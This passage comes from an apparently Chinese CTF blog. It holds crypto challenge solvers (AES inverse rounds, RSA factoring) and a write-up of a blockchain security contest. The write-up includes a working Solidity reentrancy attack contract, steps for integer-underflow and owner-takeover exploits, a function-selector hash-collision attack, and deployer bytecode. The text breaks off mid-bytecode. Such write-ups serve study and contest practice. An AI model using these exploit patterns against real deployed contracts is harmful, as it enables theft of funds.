class="number">0x94</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xc5</span>,<span class="number">0xc8</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xf1</span>,<span class="number">0xfc</span>,</span><br><span class="line">    <span class="number">0x67</span>,<span class="number">0x6a</span>,<span class="number">0x7d</span>,<span class="number">0x70</span>,<span class="number">0x53</span>,<span class="number">0x5e</span>,<span class="number">0x49</span>,<span class="number">0x44</span>,<span class="number">0x0f</span>,<span class="number">0x02</span>,<span class="number">0x15</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x0c</span>,<span class="number">0x01</span>,<span class="number">0x16</span>,<span class="number">0x1b</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x7e</span>,<span class="number">0x73</span>,<span class="number">0x50</span>,<span class="number">0x5d</span>,<span class="number">0x4a</span>,<span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0xdc</span>,<span class="number">0xd1</span>,<span class="number">0xc6</span>,<span class="number">0xcb</span>,<span class="number">0xe8</span>,<span class="number">0xe5</span>,<span class="number">0xf2</span>,<span class="number">0xff</span>,<span class="number">0xb4</span>,<span class="number">0xb9</span>,<span class="number">0xae</span>,<span class="number">0xa3</span>,<span class="number">0x80</span>,<span class="number">0x8d</span>,<span class="number">0x9a</span>,<span class="number">0x97</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_14 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x0e</span>,<span class="number">0x1c</span>,<span class="number">0x12</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x24</span>,<span class="number">0x2a</span>,<span class="number">0x70</span>,<span class="number">0x7e</span>,<span class="number">0x6c</span>,<span class="number">0x62</span>,<span class="number">0x48</span>,<span class="number">0x46</span>,<span class="number">0x54</span>,<span class="number">0x5a</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0xee</span>,<span class="number">0xfc</span>,<span class="number">0xf2</span>,<span class="number">0xd8</span>,<span class="number">0xd6</span>,<span class="number">0xc4</span>,<span class="number">0xca</span>,<span class="number">0x90</span>,<span class="number">0x9e</span>,<span class="number">0x8c</span>,<span class="number">0x82</span>,<span class="number">0xa8</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0xdb</span>,<span class="number">0xd5</span>,<span class="number">0xc7</span>,<span class="number">0xc9</span>,<span class="number">0xe3</span>,<span class="number">0xed</span>,<span class="number">0xff</span>,<span class="number">0xf1</span>,<span class="number">0xab</span>,<span class="number">0xa5</span>,<span class="number">0xb7</span>,<span class="number">0xb9</span>,<span class="number">0x93</span>,<span class="number">0x9d</span>,<span class="number">0x8f</span>,<span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x3b</span>,<span class="number">0x35</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x03</span>,<span class="number">0x0d</span>,<span class="number">0x1f</span>,<span class="number">0x11</span>,<span class="number">0x4b</span>,<span class="number">0x45</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x73</span>,<span class="number">0x7d</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xb1</span>,<span class="number">0xbf</span>,<span class="number">0x95</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0x87</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xc1</span>,<span class="number">0xcf</span>,<span class="number">0xe5</span>,<span class="number">0xeb</span>,<span class="number">0xf9</span>,<span class="number">0xf7</span>,</span><br><span class="line">    <span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x51</span>,<span class="number">0x5f</span>,<span class="number">0x75</span>,<span class="number">0x7b</span>,<span class="number">0x69</span>,<span class="number">0x67</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x21</span>,<span class="number">0x2f</span>,<span class="number">0x05</span>,<span class="number">0x0b</span>,<span class="number">0x19</span>,<span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x6a</span>,<span class="number">0x64</span>,<span class="number">0x4e</span>,<span class="number">0x40</span>,<span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x1a</span>,<span class="number">0x14</span>,<span class="number">0x3e</span>,<span class="number">0x30</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x8a</span>,<span class="number">0x84</span>,<span class="number">0xae</span>,<span class="number">0xa0</span>,<span class="number">0xb2</span>,<span class="number">0xbc</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xfa</span>,<span class="number">0xf4</span>,<span class="number">0xde</span>,<span class="number">0xd0</span>,<span class="number">0xc2</span>,<span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x41</span>,<span class="number">0x4f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x31</span>,<span class="number">0x3f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x09</span>,<span class="number">0x07</span>,<span class="number">0x15</span>,<span class="number">0x1b</span>,</span><br><span class="line">    <span class="number">0xa1</span>,<span class="number">0xaf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0x99</span>,<span class="number">0x97</span>,<span class="number">0x85</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,<span class="number">0xdf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xe9</span>,<span class="number">0xe7</span>,<span class="number">0xf5</span>,<span class="number">0xfb</span>,</span><br><span class="line">    <span class="number">0x9a</span>,<span class="number">0x94</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0xa2</span>,<span class="number">0xac</span>,<span class="number">0xbe</span>,<span class="number">0xb0</span>,<span class="number">0xea</span>,<span class="number">0xe4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xd2</span>,<span class="number">0xdc</span>,<span class="number">0xce</span>,<span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0x7a</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x42</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x50</span>,<span class="number">0x0a</span>,<span class="number">0x04</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x32</span>,<span class="number">0x3c</span>,<span class="number">0x2e</span>,<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0xec</span>,<span class="number">0xe2</span>,<span class="number">0xf0</span>,<span class="number">0xfe</span>,<span class="number">0xd4</span>,<span class="number">0xda</span>,<span class="number">0xc8</span>,<span class="number">0xc6</span>,<span class="number">0x9c</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x8e</span>,<span class="number">0xa4</span>,<span class="number">0xaa</span>,<span class="number">0xb8</span>,<span class="number">0xb6</span>,</span><br><span class="line">    <span class="number">0x0c</span>,<span class="number">0x02</span>,<span class="number">0x10</span>,<span class="number">0x1e</span>,<span class="number">0x34</span>,<span class="number">0x3a</span>,<span class="number">0x28</span>,<span class="number">0x26</span>,<span class="number">0x7c</span>,<span class="number">0x72</span>,<span class="number">0x60</span>,<span class="number">0x6e</span>,<span class="number">0x44</span>,<span class="number">0x4a</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x37</span>,<span class="number">0x39</span>,<span class="number">0x2b</span>,<span class="number">0x25</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x13</span>,<span class="number">0x1d</span>,<span class="number">0x47</span>,<span class="number">0x49</span>,<span class="number">0x5b</span>,<span class="number">0x55</span>,<span class="number">0x7f</span>,<span class="number">0x71</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,</span><br><span class="line">    <span class="number">0xd7</span>,<span class="number">0xd9</span>,<span class="number">0xcb</span>,<span class="number">0xc5</span>,<span class="number">0xef</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xfd</span>,<span class="number">0xa7</span>,<span class="number">0xa9</span>,<span class="number">0xbb</span>,<span class="number">0xb5</span>,<span class="number">0x9f</span>,<span class="number">0x91</span>,<span class="number">0x83</span>,<span class="number">0x8d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_subWord</span>(<span class="params">byteArray</span>):</span></span><br><span class="line">    res = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> byteArray:</span><br><span class="line">        res.append( S_INV_BOX[b] )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_subBytes</span>(<span class="params">aesState</span>):</span></span><br><span class="line">    resState = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(aesState),<span class="number">4</span>):</span><br><span class="line">        resState[i:i+<span class="number">4</span>] = inv_subWord(aesState[i:i+<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resState</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_shiftRow</span>(<span class="params">aesState</span>):</span></span><br><span class="line">    resState = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    0 4 8 c        0 4 8 c</span></span><br><span class="line"><span class="string">    1 5 9 d        d 1 5 9</span></span><br><span class="line"><span class="string">    2 6 a e    -&gt;  a e 2 6</span></span><br><span class="line"><span class="string">    3 7 b f        7 b f 3</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    newPosition = [ <span class="number">0</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">7</span>,</span><br><span class="line">                    <span class="number">4</span>,   <span class="number">1</span>,  <span class="number">0xe</span>, <span class="number">0xb</span>,</span><br><span class="line">                    <span class="number">8</span>,   <span class="number">5</span>,  <span class="number">2</span>, <span class="number">0xf</span>,</span><br><span class="line">                    <span class="number">0xc</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> newPosition:</span><br><span class="line">        resState.append(aesState[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resState</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_mixColumn</span>(<span class="params">aesState</span>):</span></span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(aesState),<span class="number">4</span>):</span><br><span class="line">        b0, b1, b2, b3 = aesState[i:(i+<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">        new_b0 = GF_MULT_14[b0] ^ GF_MULT_11[b1] ^ GF_MULT_13[b2] ^ GF_MULT_09[b3]</span><br><span class="line">        new_b1 = GF_MULT_09[b0] ^ GF_MULT_14[b1] ^ GF_MULT_11[b2] ^ GF_MULT_13[b3]</span><br><span class="line">        new_b2 = GF_MULT_13[b0] ^ GF_MULT_09[b1] ^ GF_MULT_14[b2] ^ GF_MULT_11[b3]</span><br><span class="line">        new_b3 = GF_MULT_11[b0] ^ GF_MULT_13[b1] ^ GF_MULT_09[b2] ^ GF_MULT_14[b3]</span><br><span class="line"></span><br><span class="line">        res.append(new_b0) </span><br><span class="line">        res.append(new_b1) </span><br><span class="line">        res.append(new_b2) </span><br><span class="line">        res.append(new_b3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES_Decryption</span>(<span class="params">cipherText, AES_key, nbRound</span>):</span></span><br><span class="line"></span><br><span class="line">    res = cipherText</span><br><span class="line"></span><br><span class="line">    res = inv_shiftRow(res)</span><br><span class="line"></span><br><span class="line">    res = inv_subBytes(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbRound-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        res = inv_mixColumn(res)</span><br><span class="line"></span><br><span class="line">        res = inv_shiftRow(res)</span><br><span class="line"></span><br><span class="line">        res = inv_subBytes(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    AES_Key = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">        cipherText = f_in.read()</span><br><span class="line">    </span><br><span class="line">    secondPlainText = AES_Decryption(cipherText, AES_Key,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    print(secondPlainText)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="Easy-Rsa"><a href="#Easy-Rsa" class="headerlink" title="Easy_Rsa"></a>Easy_Rsa</h1><p>google找到几乎原题，直接用</p>
<p><img src="/2021/09/12/28/image-20210912110415015.png" alt="image-20210912110415015"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            print(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">    e = <span class="number">58337</span></span><br><span class="line">    c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line">    p,q=rho(n)</span><br><span class="line">    phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 求d</span></span><br><span class="line">    d= gmpy2.invert(e,phi_n)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 用d解密</span></span><br><span class="line">    flag=gmpy2.powmod(c,d,n)</span><br><span class="line">    print(long_to_bytes(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa?"></a>Rsa?</h1><p><img src="/2021/09/12/28/IMG_20210912_151728.jpg" alt="IMG_20210912_151728"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a1 = <span class="number">5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110</span></span><br><span class="line">a2 = <span class="number">2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785</span></span><br><span class="line">a = <span class="number">1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141</span></span><br><span class="line">p = <span class="number">115718235064789220654263009993128325569382592506655305434488398268608329541037</span></span><br><span class="line">q = <span class="number">115718235064789220654263009993128324769382192706654302434478391267607309966379</span></span><br><span class="line">N = <span class="number">13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023</span></span><br><span class="line">phi_N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    d = gmpy2.invert(e,phi_N)</span><br><span class="line">    A = gmpy2.powmod(a1+a*a2,<span class="number">1</span>,N)</span><br><span class="line">    inv_Z1 = gmpy2.powmod(A,d,N)</span><br><span class="line">    Z1 = gmpy2.invert(inv_Z1,N)</span><br><span class="line">    inv_2 = gmpy2.invert(<span class="number">2</span>,N)</span><br><span class="line">    X = gmpy2.powmod(((Z1+inv_Z1)*inv_2),<span class="number">1</span>, N)</span><br><span class="line">    Y = gmpy2.powmod((N+inv_Z1-X)*gmpy2.invert(a,N),<span class="number">1</span>,N)</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Y=main()</span><br><span class="line">    print(long_to_bytes(Y))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>首届可信链区块链安全攻防大赛Solidity合约全解</title>
    <url>/2021/10/22/30/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了不使得文章过长，将代码文件放置在<a href="https://github.com/zpano/BlockChain-Security/">个人GitHub上 欢迎star</a> 提供下载</p>
<h1 id="赛题一"><a href="#赛题一" class="headerlink" title="赛题一"></a>赛题一</h1><p>通过重写函数实现重入攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface IFlashLoanTokenReceiver &#123;</span><br><span class="line">    function execute() external;</span><br><span class="line">&#125;</span><br><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; token.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; amount, &quot;Not enough ETH in balance&quot;);</span><br><span class="line">        token.transfer(msg.sender, amount);</span><br><span class="line">        IFlashLoanTokenReceiver(msg.sender).execute();</span><br><span class="line"></span><br><span class="line">        require(token.balanceOf(address(this)) &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>攻击思路：</p>
<ul>
<li>首先进入flashLoan函数，贷走所有的金额</li>
<li>利用IFlashLoanTokenReceiver(msg.sender).execute();重入调用deposit函数，将钱归还闪电贷。此时由于重入deposit函数，会记录一个错误的用户余额。</li>
<li>调用withdraw函数获得合约中全部的token。</li>
</ul>
<p>攻击代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract dvt1_attack&#123;</span><br><span class="line">    address target &#x3D; DaoPool address;</span><br><span class="line">    address token &#x3D; DVT1 address;</span><br><span class="line">	  uint256 amount;</span><br><span class="line">    function execute() external &#123;</span><br><span class="line">        IERC20(token).approve(target,amount);</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;deposit(uint256)&quot;, amount)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        amount &#x3D; IERC20(token).balanceOf(target);</span><br><span class="line">        target.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;flashLoan(uint256)&quot;, amount)</span><br><span class="line">        );</span><br><span class="line">        target.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;withdraw()&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="赛题二"><a href="#赛题二" class="headerlink" title="赛题二"></a>赛题二</h1><ul>
<li>owner权限控制错误</li>
<li>空投薅羊毛</li>
<li>有奖竞猜</li>
<li>整数溢出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function DvT2() public&#123; &#x2F;&#x2F;owner权限控制错误</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function profit() public &#123;  &#x2F;&#x2F;空投薅羊毛</span><br><span class="line">        require(gift[msg.sender]&#x3D;&#x3D;0);</span><br><span class="line">        gift[msg.sender]&#x3D;1;</span><br><span class="line">        balanceOf[msg.sender]+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function betgame(uint secretguess) public &#123;  &#x2F;&#x2F;有奖竞猜</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-&#x3D;1;</span><br><span class="line">        if (secretguess&#x3D;&#x3D;secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+&#x3D;2;</span><br><span class="line">            isbet[msg.sender]&#x3D;1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">function doublebetgame(uint secretguess) public only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]&#x3D;&#x3D;1);</span><br><span class="line">        balanceOf[msg.sender]-&#x3D;2;</span><br><span class="line">        if (secretguess&#x3D;&#x3D;secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+&#x3D;2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>调用DvT2函数使自己变成owner</li>
<li>调用setsecret函数设置secret</li>
<li>调用profit空投以便后续调用betgame</li>
<li>调用一次正确betgame 使得balanceOf[msg.sender]=2</li>
<li>调用一次错误betgame 使得balanceOf[msg.sender]=1</li>
<li>调用一次错误doublebetgame使得balanceOf[msg.sender]下溢出</li>
<li>调用payforflag</li>
</ol>
<p><a href="https://ropsten.etherscan.io/address/0x675f4b9bb2f2380470570c64bab801e0ad76ee68">攻击过程</a></p>
<h1 id="赛题三"><a href="#赛题三" class="headerlink" title="赛题三"></a>赛题三</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function TransferOrAirDrop(address to, bool isTransfer, bytes calldata _method, uint256 amount) external &#123;</span><br><span class="line">        if (isTransfer) &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool success;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(address,address,uint256)&quot;))),abi.encode(msg.sender,to,amount)));</span><br><span class="line"></span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool isFristAirDropFlag;</span><br><span class="line">            bool success;</span><br><span class="line">            if(AirDropCount[msg.sender] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                isFristAirDropFlag &#x3D; true;</span><br><span class="line">            &#125; else if (AirDropCount[msg.sender] &gt; 2) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bool,address)&quot;))), abi.encode(isFristAirDropFlag, msg.sender)));</span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">            AirDropCount[msg.sender]++;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与八月份发生的Poly Network 事件类似，通过实现哈希碰撞调用DVT3合约的changeOwner函数，将DVT3合约的owner重置为我们所掌握的以太坊账号进而触发<code>SendFlag</code>事件</p>
<p><img src="/2021/10/22/30/Untitled.png" alt="Untitled"></p>
<p><img src="/2021/10/22/30/image-20211023203413456.png" alt="image-20211023203413456"></p>
<p><img src="/2021/10/22/30/image-20211023203446205.png" alt="image-20211023203446205"></p>
<h1 id="赛题四"><a href="#赛题四" class="headerlink" title="赛题四"></a>赛题四</h1><ul>
<li>合约调用（tx.origin ! = msg.sender)</li>
<li>create2构造特定合约地址</li>
<li>view函数两次调用返回不同值</li>
<li>利用selfdestruc强制转账</li>
<li>重入漏洞</li>
<li>整数溢出漏洞</li>
</ul>
<p>通过分析，需要首先获得owner权限，然后调用buy函数，最后调用payforflag函数。</p>
<ol>
<li>获得owner权限</li>
</ol>
<p>获得owner权限首先要绕过change函数里面的检查，由于声明了是view函数，因此不能通过变量记录是第几次调用。于是想到通过获取gas来判断调用到了哪里。控制交易的gas值为固定值，通过一次debug记录第一次执行到该步骤时候的剩余gas值。填入合约的判断条件中即可。</p>
<ol>
<li>create2构造特定结尾的合约，利用另一个depoly合约辅助构建一个能绕过检查的合约。</li>
<li>调用buy函数，同时调用多次from == to的transfer，获得足够的钱</li>
<li>利用别的合约自毁给合约转账</li>
<li>利用重入+整数溢出构造buyTimes的值</li>
</ol>
<p>前期部署</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Deployer &#123;</span><br><span class="line">    &#x2F;&#x2F; contractBytecode是待部署合约的bytecode</span><br><span class="line">    bytes contractBytecode &#x3D; hex&quot;608060405260016000806101000a81548160ff021916908315150217905550610f3b8061002d6000396000f3fe6080604052600436106100745760003560e01c80637b1c7c461161004e5780637b1c7c461461040a578063a19e69c21461045b578063c224ed1a146104ac578063dac5f65f146104f057610075565b80630c200e4c146101e85780631fbe98ce146102d05780632f54bf6e146103a357610075565b5b60008054906101000a900460ff16156101e6573373ffffffffffffffffffffffffffffffffffffffff1660c8604051602401808281526020019150506040516020818303038152906040527fe4849b32000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610161578051825260208201915060208101905060208303925061013e565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101c3576040519150601f19603f3d011682016040523d82523d6000602084013e6101c8565b606091505b50505060008060006101000a81548160ff0219169083151502179055505b005b3480156101f457600080fd5b506102ce6004803603604081101561020b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019064010000000081111561024857600080fd5b82018360208201111561025a57600080fd5b8035906020019184600183028401116401000000008311171561027c57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610541565b005b3480156102dc57600080fd5b5061031f600480360360208110156102f357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506106ec565b60405180831515815260200180602001828103825283818151815260200191508051906020019080838360005b8381101561036757808201518184015260208101905061034c565b50505050905090810190601f1680156103945780820380516001836020036101000a031916815260200191505b50935050505060405180910390f35b3480156103af57600080fd5b506103f2600480360360208110156103c657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610855565b60405180821515815260200191505060405180910390f35b34801561041657600080fd5